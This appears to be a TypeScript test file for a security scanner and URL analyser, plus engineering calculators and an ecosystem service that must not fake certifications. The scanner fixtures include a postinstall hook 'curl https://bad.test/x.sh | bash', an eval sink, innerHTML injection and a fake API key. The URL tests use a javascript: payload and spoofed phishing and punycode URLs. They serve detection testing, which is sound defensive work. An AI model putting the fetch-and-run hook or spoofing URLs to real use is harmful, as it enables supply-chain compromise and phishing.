import test from 'node:test';
import assert from 'node:assert/strict';
import { scanFilesWithWatchdog, analyzeUrlWithWatchdog } from './watchdogSecurityService';
import {
  calculateElectricalAndSolar,
  calculateRoboticsMechatronics,
  calculateAerospacePreliminary,
  calculateVehicleEvPreliminary,
  searchSafetyChecklists,
} from '../core/engineeringSafetyEngine';
import { annyEcosystemService } from './annyEcosystemService';

test('Watchdog detects leaked secrets, DOM XSS, eval, traversal, and risky install scripts with redacted evidence', () => {
  const sampleKey = 'AIzaSy' + 'A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6';
  const report = scanFilesWithWatchdog({
    'src/config.ts': `export const k = "${sampleKey}";\nexport const fn = (c: string) => eval(c);`,
    'src/ui.ts': `el.innerHTML = userInput;`,
    '../escape.txt': 'bad path',
    'package.json': JSON.stringify({ name: 'demo', scripts: { postinstall: 'curl https://bad.test/x.sh | bash' } }),
  });

  assert.equal(report.targetCount, 4);
  assert.ok(report.riskScore >= 70, `Expected high riskScore, got ${report.riskScore}`);
  assert.equal(report.riskLevel, 'CRITICAL');

  const keyFinding = report.findings.find((f) => f.category === 'secret_exposure');
  assert.ok(keyFinding, 'Should flag leaked API key');
  assert.ok(!keyFinding.evidence.includes(sampleKey), 'Evidence must redact full raw key');

  assert.ok(report.findings.some((f) => f.category === 'code_execution_risk'));
  assert.ok(report.findings.some((f) => f.category === 'xss_or_script_injection'));
  assert.ok(report.findings.some((f) => f.category === 'path_traversal'));
  assert.ok(report.findings.some((f) => f.category === 'supply_chain_risk'));
});

test('Watchdog scores clean artifact as MINIMAL without claiming host-wide security certification', () => {
  const report = scanFilesWithWatchdog({
    'src/math.ts': 'export function add(a: number, b: number): number { return a + b; }\n',
  });
  assert.equal(report.riskScore, 0);
  assert.equal(report.riskLevel, 'MINIMAL');
  assert.equal(report.findings.length, 0);
  assert.match(report.disclaimer, /does not certify full system security/i);
});

test('Watchdog URL analyzer catches javascript:, raw IPv4, userinfo @ spoofing, and punycode while clearing clean HTTPS', () => {
  const jsUrl = analyzeUrlWithWatchdog('javascript:alert(1)');
  assert.equal(jsUrl.safeToOpen, false);
  assert.equal(jsUrl.riskLevel, 'CRITICAL');

  const phishUrl = analyzeUrlWithWatchdog('http://paypal@198.51.100.42/login-security-update');
  assert.equal(phishUrl.safeToOpen, false);
  assert.ok(phishUrl.signals.some((s) => s.code === 'CREDENTIAL_AUTHORITY_SPOOF'));
  assert.ok(phishUrl.signals.some((s) => s.code === 'RAW_IP_HOST'));
  assert.ok(phishUrl.signals.some((s) => s.code === 'SCAM_PHISHING_KEYWORDS'));

  const idnUrl = analyzeUrlWithWatchdog('https://xn--pypal-4ve.com/verify');
  assert.ok(idnUrl.signals.some((s) => s.code === 'PUNYCODE_IDN_HOMOGRAPH'));

  const cleanUrl = analyzeUrlWithWatchdog('https://docs.python.org/3/library/unittest.html');
  assert.equal(cleanUrl.valid, true);
  assert.equal(cleanUrl.safeToOpen, true);
  assert.equal(cleanUrl.riskLevel, 'LOW');
});

test('Engineering engine computes electrical voltage drop warning, robotics torque, aerospace stall estimate, and EV consumption with mandatory disclaimers', () => {
  const elec = calculateElectricalAndSolar({
    voltageV: 230,
    currentA: 32,
    phases: 3,
    cableLengthM: 80,
    conductorMm2: 2.5,
  });
  assert.ok(elec.outputs.some((o) => o.label === 'Active Power'));
  assert.ok(elec.warnings.some((w) => /exceeds common 3% branch-circuit guideline/i.test(w)));
  assert.match(elec.disclaimer, /PRELIMINARY ENGINEERING ESTIMATE ONLY/);
  assert.ok(elec.toolchainArtifact?.filename.endsWith('.st'));

  const robo = calculateRoboticsMechatronics({
    payloadKg: 10,
    armLengthM: 0.8,
    targetAngularAccelRadS2: 5,
    safetyFactor: 2.0,
  });
  assert.ok(robo.outputs.some((o) => o.label.includes('Required Actuator Torque')));
  assert.ok(robo.toolchainArtifact?.filename.endsWith('.py'));

  const aero = calculateAerospacePreliminary({
    massKg: 15,
    wingAreaM2: 0.9,
    clMax: 1.4,
  });
  assert.ok(aero.outputs.some((o) => o.label.includes('Sea-Level Stall Speed')));
  assert.match(aero.disclaimer, /PRELIMINARY ENGINEERING ESTIMATE ONLY/);
  assert.ok(aero.warnings.some((w) => /AIRWORTHINESS NOTICE/i.test(w)));
  assert.ok(aero.toolchainArtifact?.filename.endsWith('.scad'));

  const ev = calculateVehicleEvPreliminary({
    vehicleMassKg: 1500,
    batteryKwh: 60,
    cruiseSpeedKmh: 100,
  });
  assert.ok(ev.outputs.some((o) => o.label.includes('Range')));
});

test('Offline safety checklists filter accurately and disclose non-dialing non-medical scope', () => {
  const all = searchSafetyChecklists('');
  assert.ok(all.length >= 5);
  for (const item of all) {
    assert.ok(item.immediateSteps.length > 0);
    assert.ok(item.disclaimer.length > 10);
  }

  const elecLists = searchSafetyChecklists('electrical');
  assert.ok(elecLists.some((c) => c.id === 'electrical_emergency'));
  assert.match(elecLists[0].disclaimer, /does NOT automatically dial emergency services/i);
});

test('AnnyEcosystemService initializes zero fabricated counters and refuses fake certification/escrow claims', async () => {
  const enterprises = annyEcosystemService.getEnterprises();
  assert.ok(enterprises.length >= 6);
  for (const e of enterprises) {
    assert.equal(e.totalRequestsCount, 0, `Enterprise ${e.id} must not start with fabricated request count`);
  }

  const levels = annyEcosystemService.getControlHierarchy();
  const lvl4 = levels.find((l) => l.level === 4);
  const lvl5 = levels.find((l) => l.level === 5);
  assert.equal(lvl4?.status, 'SIMULATION_ONLY');
  assert.equal(lvl4?.lotoStatus, 'LOCKED_OUT');
  assert.equal(lvl5?.status, 'SIMULATION_ONLY');
  assert.equal(lvl5?.lotoStatus, 'LOCKED_OUT');

  const aeroAction = await annyEcosystemService.executeCapabilityPackAction({
    companyId: 'aerospace',
    packName: 'AeroCore',
    action: 'verify_avionics',
    params: {},
    requestedBy: 'unit_test',
  });
  const serializedAero = JSON.stringify(aeroAction);
  assert.ok(!serializedAero.includes('DO-178C LEVEL A VERIFIED'), 'Must never claim DO-178C airworthiness certification');
  assert.equal(aeroAction.resultData.notCertifiedAirworthy, true);

  const fintechAction = await annyEcosystemService.executeCapabilityPackAction({
    companyId: 'kenpay',
    packName: 'KenPay',
    action: 'escrow_lock',
    params: { amount: 100 },
    requestedBy: 'unit_test',
  });
  const serializedFintech = JSON.stringify(fintechAction);
  assert.ok(!serializedFintech.includes('FUNDS_LOCKED_IN_ESCROW'), 'Must never fake live escrow funds lock');
  assert.equal(fintechAction.resultData.status, 'BANKING_CORE_NOT_CONNECTED');
});
